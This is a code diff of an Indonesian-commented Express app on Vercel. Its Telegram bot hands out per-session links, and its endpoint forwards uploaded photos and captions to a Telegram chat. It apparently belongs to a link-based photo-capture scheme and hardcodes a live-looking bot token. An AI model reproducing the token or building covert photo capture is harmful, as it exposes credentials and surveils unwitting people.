@@ -8,10 +8,11 @@ const upload = multer();
 
 const BOT_TOKEN = "8179083757:AAHqeyoHWGI9cGHkgjSplUKXGGAn2D6goKQ"; // Ganti dengan token bot Anda
 const CHAT_ID = "YOUR_CHAT_ID"; // Ganti dengan ID chat Anda
+const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
 // Fungsi untuk mengirim pesan teks ke bot Telegram
 async function sendTextMessage(chatId, text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const url = `${telegramApiUrl}sendMessage`;
     const body = {
         chat_id: chatId,
         text: text,
@@ -29,6 +30,25 @@ async function sendTextMessage(chatId, text) {
     }
 }
 
+// Fungsi untuk mengatur webhook Telegram
+async function setWebhook() {
+    const url = `https://cokots.vercel.app/bot-webhook`; // Ganti dengan URL endpoint webhook Anda di Vercel
+    try {
+        const response = await fetch(`${telegramApiUrl}setWebhook?url=${url}`);
+        const result = await response.json();
+        if (result.ok) {
+            console.log(`Webhook set to: ${url}`);
+        } else {
+            console.log('Webhook setup failed:', result.description);
+        }
+    } catch (error) {
+        console.error('Failed to set webhook:', error);
+    }
+}
+
+// Panggil setWebhook hanya sekali saat aplikasi dijalankan pertama kali
+setWebhook();
+
 // Command handler untuk perintah /link
 app.post("/bot-webhook", express.json(), async (req, res) => {
     try {
@@ -36,7 +56,7 @@ app.post("/bot-webhook", express.json(), async (req, res) => {
 
         if (message && message.text === "/link") {
             const sessionId = Math.random().toString(36).substr(2, 9); // ID sesi unik
-            const websiteLink = `https://akhirpetang.vercel.app/access?session=${sessionId}`; // URL website Anda
+            const websiteLink = `https://akhirpetang.vercel.app/access?session=${sessionId}`; // Ganti dengan URL website Anda
             const responseMessage = `Silakan klik link berikut untuk akses:\n${websiteLink}`;
             await sendTextMessage(message.chat.id, responseMessage);
         }
@@ -68,7 +88,7 @@ app.post("/send-data", upload.single("photo"), async (req, res) => {
         formData.append("photo", req.file.buffer, "photo.jpg");
         formData.append("caption", caption);
 
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        const response = await fetch(`${telegramApiUrl}sendPhoto`, {
             method: "POST",
             body: formData,
         });
@@ -90,4 +110,4 @@ app.all("*", (req, res) => {
     res.status(404).send("Endpoint tidak ditemukan.");
 });
 
-module.exports = app;
+module.exports = app; // Ekspor app untuk Vercel
